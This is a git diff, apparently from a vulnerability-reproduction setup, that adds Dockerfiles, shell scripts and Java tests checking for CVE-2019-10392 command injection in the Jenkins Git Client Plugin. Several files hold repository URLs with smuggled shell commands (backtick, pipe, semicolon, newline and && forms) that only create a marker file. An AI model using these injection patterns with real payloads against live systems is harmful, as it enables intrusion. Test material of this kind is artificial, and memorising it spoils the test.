diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 0000000..28cdaf0
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/jenkinsci__git-client-plugin_CVE-2019-10392_2.8.4 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 0000000..8b13789
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..2243742
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,22 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/jenkinsci__git-client-plugin_CVE-2019-10392_2.8.4 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+
+# Make the test script executable
+RUN chmod +x run_minimal_test.sh
+
+# Run the test script with a timeout
+CMD ["timeout", "300s", "./run_minimal_test.sh"]
diff --git a/MinimalVulnerabilityTest.java b/MinimalVulnerabilityTest.java
new file mode 100644
index 0000000..a2751c3
--- /dev/null
+++ b/MinimalVulnerabilityTest.java
@@ -0,0 +1,65 @@
+import org.jenkinsci.plugins.gitclient.CliGitAPIImpl;
+import hudson.EnvVars;
+import hudson.model.TaskListener;
+import hudson.util.StreamTaskListener;
+
+import java.io.File;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+/**
+ * Minimal test for CVE-2019-10392 - Command Injection vulnerability in Git Client Plugin
+ */
+public class MinimalVulnerabilityTest {
+    private static final String MARKER_FILE = "/tmp/git-client-injection-test";
+
+    public static void main(String[] args) {
+        try {
+            System.out.println("Starting vulnerability test...");
+            
+            // Delete the marker file if it exists
+            Files.deleteIfExists(Paths.get(MARKER_FILE));
+            System.out.println("Deleted marker file if it existed");
+            
+            // Create a temporary directory
+            File tempDir = new File("/tmp/git-test");
+            tempDir.mkdirs();
+            System.out.println("Created temp directory: " + tempDir.getAbsolutePath());
+            
+            // Create a CliGitAPIImpl instance
+            TaskListener listener = new StreamTaskListener(System.out);
+            CliGitAPIImpl git = new CliGitAPIImpl("git", tempDir, listener, new EnvVars());
+            System.out.println("Created CliGitAPIImpl instance");
+            
+            // Test with a malicious URL
+            String url = "http://example.com/repo.git;touch " + MARKER_FILE;
+            System.out.println("Testing URL: " + url);
+            
+            // Call the vulnerable method
+            try {
+                git.getRemoteReferences(url, null, false, false);
+                System.out.println("getRemoteReferences completed");
+            } catch (Exception e) {
+                System.out.println("Exception during getRemoteReferences: " + e.getClass().getName() + ": " + e.getMessage());
+            }
+            
+            // Check if the marker file was created
+            boolean markerExists = Files.exists(Paths.get(MARKER_FILE));
+            System.out.println("Marker file exists: " + markerExists);
+            
+            if (markerExists) {
+                System.out.println("VULNERABILITY DETECTED: Marker file was created through command injection");
+                System.out.println("Test FAILED - vulnerability exists");
+                System.exit(1);
+            } else {
+                System.out.println("Marker file was not created");
+                System.out.println("Test PASSED - vulnerability does not exist");
+                System.exit(0);
+            }
+        } catch (Exception e) {
+            System.out.println("Unexpected error: " + e);
+            e.printStackTrace();
+            System.exit(2);
+        }
+    }
+}
diff --git a/VulnerabilityTest.java b/VulnerabilityTest.java
new file mode 100644
index 0000000..76b4a16
--- /dev/null
+++ b/VulnerabilityTest.java
@@ -0,0 +1,97 @@
+import org.jenkinsci.plugins.gitclient.CliGitAPIImpl;
+import hudson.EnvVars;
+import hudson.model.TaskListener;
+import hudson.plugins.git.GitException;
+import hudson.util.StreamTaskListener;
+
+import java.io.File;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+/**
+ * Test for CVE-2019-10392 - Command Injection vulnerability in Git Client Plugin
+ */
+public class VulnerabilityTest {
+
+    private static final String MARKER_FILE = "/tmp/git-client-injection-test";
+
+    public static void main(String[] args) {
+        try {
+            System.out.println("Starting vulnerability test...");
+            
+            // Delete the marker file if it exists
+            Files.deleteIfExists(Paths.get(MARKER_FILE));
+            System.out.println("Deleted marker file if it existed");
+            
+            // Create a temporary directory
+            File tempDir = new File("/tmp/git-test");
+            tempDir.mkdirs();
+            System.out.println("Created temp directory: " + tempDir.getAbsolutePath());
+            
+            // Create a CliGitAPIImpl instance directly
+            TaskListener listener = new StreamTaskListener(System.out);
+            CliGitAPIImpl git = new CliGitAPIImpl("git", tempDir, listener, new EnvVars());
+            System.out.println("Created CliGitAPIImpl instance");
+            
+            // Try different malicious URL formats
+            testUrl(git, "file:///tmp/non-existent-repo`touch " + MARKER_FILE + "`");
+            if (Files.exists(Paths.get(MARKER_FILE))) {
+                System.out.println("Vulnerability exists with backtick injection - test FAILS");
+                System.exit(1);
+            }
+            
+            testUrl(git, "file:///tmp/non-existent-repo|touch " + MARKER_FILE);
+            if (Files.exists(Paths.get(MARKER_FILE))) {
+                System.out.println("Vulnerability exists with pipe injection - test FAILS");
+                System.exit(1);
+            }
+            
+            testUrl(git, "file:///tmp/non-existent-repo;touch " + MARKER_FILE);
+            if (Files.exists(Paths.get(MARKER_FILE))) {
+                System.out.println("Vulnerability exists with semicolon injection - test FAILS");
+                System.exit(1);
+            }
+            
+            testUrl(git, "file:///tmp/non-existent-repo\ntouch " + MARKER_FILE);
+            if (Files.exists(Paths.get(MARKER_FILE))) {
+                System.out.println("Vulnerability exists with newline injection - test FAILS");
+                System.exit(1);
+            }
+            
+            testUrl(git, "file:///tmp/non-existent-repo && touch " + MARKER_FILE);
+            if (Files.exists(Paths.get(MARKER_FILE))) {
+                System.out.println("Vulnerability exists with && injection - test FAILS");
+                System.exit(1);
+            }
+            
+            // If we get here, none of the injection attempts worked
+            System.out.println("Vulnerability does not exist - test PASSES");
+            System.exit(0);
+            
+        } catch (Exception e) {
+            System.out.println("Unexpected error: " + e);
+            e.printStackTrace();
+            System.exit(2);
+        }
+    }
+    
+    private static void testUrl(CliGitAPIImpl git, String url) {
+        System.out.println("\nTesting URL: " + url);
+        try {
+            // Delete the marker file if it exists
+            Files.deleteIfExists(Paths.get(MARKER_FILE));
+            
+            // Call the vulnerable method
+            git.getRemoteReferences(url, null, false, false);
+            System.out.println("getRemoteReferences completed without exception");
+        } catch (GitException | InterruptedException | IOException e) {
+            // Expected to fail since the repository doesn't exist
+            System.out.println("Expected exception: " + e.getClass().getName() + ": " + e.getMessage());
+        }
+        
+        // Check if the marker file was created
+        boolean markerExists = Files.exists(Paths.get(MARKER_FILE));
+        System.out.println("Marker file exists: " + markerExists);
+    }
+}
diff --git a/run_minimal_test.sh b/run_minimal_test.sh
new file mode 100644
index 0000000..31ea1d3
--- /dev/null
+++ b/run_minimal_test.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+# Build the project first
+echo "Building the project..."
+mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Get the classpath
+CLASSPATH="target/git-client-2.8.4.jar:$(mvn dependency:build-classpath -q -Dmdep.outputFile=/dev/stdout)"
+
+# Compile the test
+echo "Compiling the test..."
+javac -cp "$CLASSPATH" MinimalVulnerabilityTest.java
+
+# Run the test
+echo "Running the test..."
+java -cp ".:$CLASSPATH" MinimalVulnerabilityTest
+
+# Return the exit code from the test
+exit $?
diff --git a/src/test/java/org/jenkinsci/plugins/gitclient/CommandInjectionTest.java b/src/test/java/org/jenkinsci/plugins/gitclient/CommandInjectionTest.java
new file mode 100644
index 0000000..47e5238
--- /dev/null
+++ b/src/test/java/org/jenkinsci/plugins/gitclient/CommandInjectionTest.java
@@ -0,0 +1,74 @@
+package org.jenkinsci.plugins.gitclient;
+
+import hudson.EnvVars;
+import hudson.model.TaskListener;
+import org.junit.Test;
+
+import java.io.File;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+/**
+ * Test for CVE-2019-10392 - Command Injection vulnerability in Git Client Plugin
+ */
+public class CommandInjectionTest {
+
+    private static final String MARKER_FILE = "/tmp/git-client-injection-test";
+
+    /**
+     * Test for command injection vulnerability in getRemoteReferences method.
+     * This test attempts to inject a command that will create a file.
+     * If the vulnerability exists, the command will be executed and the file will be created.
+     */
+    @Test
+    public void testCommandInjectionInGetRemoteReferences() throws Exception {
+        System.out.println("Starting command injection test...");
+        
+        // Delete the marker file if it exists
+        Files.deleteIfExists(Paths.get(MARKER_FILE));
+        System.out.println("Deleted marker file if it existed");
+        
+        // Create a temporary directory for the test
+        File tempDir = Files.createTempDirectory("git-client-test").toFile();
+        System.out.println("Created temp directory: " + tempDir.getAbsolutePath());
+        
+        // Create a Git client
+        GitClient gitClient = Git.with(TaskListener.NULL, new EnvVars())
+                .in(tempDir)
+                .using("git")
+                .getClient();
+        System.out.println("Git client created: " + gitClient.getClass().getName());
+        
+        // Malicious URL with command injection using backticks
+        String maliciousUrl = "file:///tmp/non-existent-repo`touch " + MARKER_FILE + "`";
+        System.out.println("Using malicious URL: " + maliciousUrl);
+        
+        try {
+            System.out.println("Calling getRemoteReferences with malicious URL...");
+            // Call the vulnerable method
+            gitClient.getRemoteReferences(maliciousUrl, null, false, false);
+            System.out.println("getRemoteReferences completed without exception");
+        } catch (Exception e) {
+            // Expected to fail since the repository doesn't exist
+            System.out.println("Expected exception occurred: " + e.getClass().getName() + ": " + e.getMessage());
+        }
+        
+        // Check if the marker file was created, which would indicate command injection
+        boolean vulnerabilityExists = Files.exists(Paths.get(MARKER_FILE));
+        System.out.println("Marker file exists: " + vulnerabilityExists);
+        
+        // Clean up
+        if (tempDir.exists()) {
+            tempDir.delete();
+        }
+        
+        // Exit with appropriate code based on vulnerability existence
+        if (vulnerabilityExists) {
+            System.out.println("Vulnerability exists - test FAILS");
+            System.exit(1); // Exit with non-zero code if vulnerability exists
+        } else {
+            System.out.println("Vulnerability does not exist - test PASSES");
+            System.exit(0); // Exit with zero code if vulnerability is fixed
+        }
+    }
+}
diff --git a/test_git_command_injection.sh b/test_git_command_injection.sh
new file mode 100644
index 0000000..e7f2dcf
--- /dev/null
+++ b/test_git_command_injection.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+
+# This script tests for command injection vulnerability in git ls-remote
+# It simulates the behavior of the Jenkins Git Client Plugin
+
+# Define the marker file
+MARKER_FILE="/tmp/git-client-injection-test"
+
+# Remove the marker file if it exists
+rm -f "$MARKER_FILE"
+echo "Removed marker file if it existed"
+
+# Test with a malicious URL containing command injection
+echo "Testing with semicolon injection..."
+MALICIOUS_URL="http://example.com/repo.git;touch $MARKER_FILE"
+echo "Using URL: $MALICIOUS_URL"
+
+# Execute git ls-remote with the malicious URL
+# This simulates what the plugin does internally
+git ls-remote "$MALICIOUS_URL" || echo "Git command failed as expected"
+
+# Check if the marker file was created
+if [ -f "$MARKER_FILE" ]; then
+    echo "VULNERABILITY DETECTED: Marker file was created through command injection"
+    echo "Test FAILED - vulnerability exists"
+    exit 1
+else
+    echo "Marker file was not created"
+    echo "Test PASSED - vulnerability does not exist"
+    exit 0
+fi
diff --git a/test_vulnerability.sh b/test_vulnerability.sh
new file mode 100644
index 0000000..0b69e85
--- /dev/null
+++ b/test_vulnerability.sh
@@ -0,0 +1,69 @@
+#!/bin/bash
+
+# This script tests for the command injection vulnerability in Git Client Plugin
+
+# Define the marker file
+MARKER_FILE="/tmp/git-client-injection-test"
+
+# Remove the marker file if it exists
+rm -f "$MARKER_FILE"
+echo "Removed marker file if it existed"
+
+# Create a simple Java program that uses the plugin to test for the vulnerability
+cat > TestVulnerability.java << 'EOF'
+import org.jenkinsci.plugins.gitclient.CliGitAPIImpl;
+import hudson.EnvVars;
+import hudson.model.TaskListener;
+import hudson.util.StreamTaskListener;
+import java.io.File;
+import java.io.PrintStream;
+
+public class TestVulnerability {
+    public static void main(String[] args) {
+        try {
+            System.out.println("Starting vulnerability test...");
+            
+            // Create a CliGitAPIImpl instance directly
+            TaskListener listener = new StreamTaskListener(System.out);
+            CliGitAPIImpl git = new CliGitAPIImpl("git", new File("."), listener, new EnvVars());
+            System.out.println("Created CliGitAPIImpl instance");
+            
+            // Test with a malicious URL
+            String url = "http://example.com/repo.git;touch /tmp/git-client-injection-test";
+            System.out.println("Testing URL: " + url);
+            
+            // Call the vulnerable method
+            try {
+                git.getRemoteReferences(url, null, false, false);
+                System.out.println("getRemoteReferences completed");
+            } catch (Exception e) {
+                System.out.println("Exception: " + e.getClass().getName() + ": " + e.getMessage());
+            }
+            
+            System.out.println("Test completed");
+        } catch (Exception e) {
+            System.out.println("Unexpected exception: " + e.getClass().getName() + ": " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+}
+EOF
+
+# Compile the test program
+echo "Compiling test program..."
+javac -cp /project/target/git-client-2.8.4.jar:$(mvn -f /project/pom.xml dependency:build-classpath -q -Dmdep.outputFile=/dev/stdout) TestVulnerability.java
+
+# Run the test program
+echo "Running test program..."
+java -cp .:/project/target/git-client-2.8.4.jar:$(mvn -f /project/pom.xml dependency:build-classpath -q -Dmdep.outputFile=/dev/stdout) TestVulnerability
+
+# Check if the marker file was created
+if [ -f "$MARKER_FILE" ]; then
+    echo "VULNERABILITY DETECTED: Marker file was created through command injection"
+    echo "Test FAILED - vulnerability exists"
+    exit 1
+else
+    echo "Marker file was not created"
+    echo "Test PASSED - vulnerability does not exist"
+    exit 0
+fi
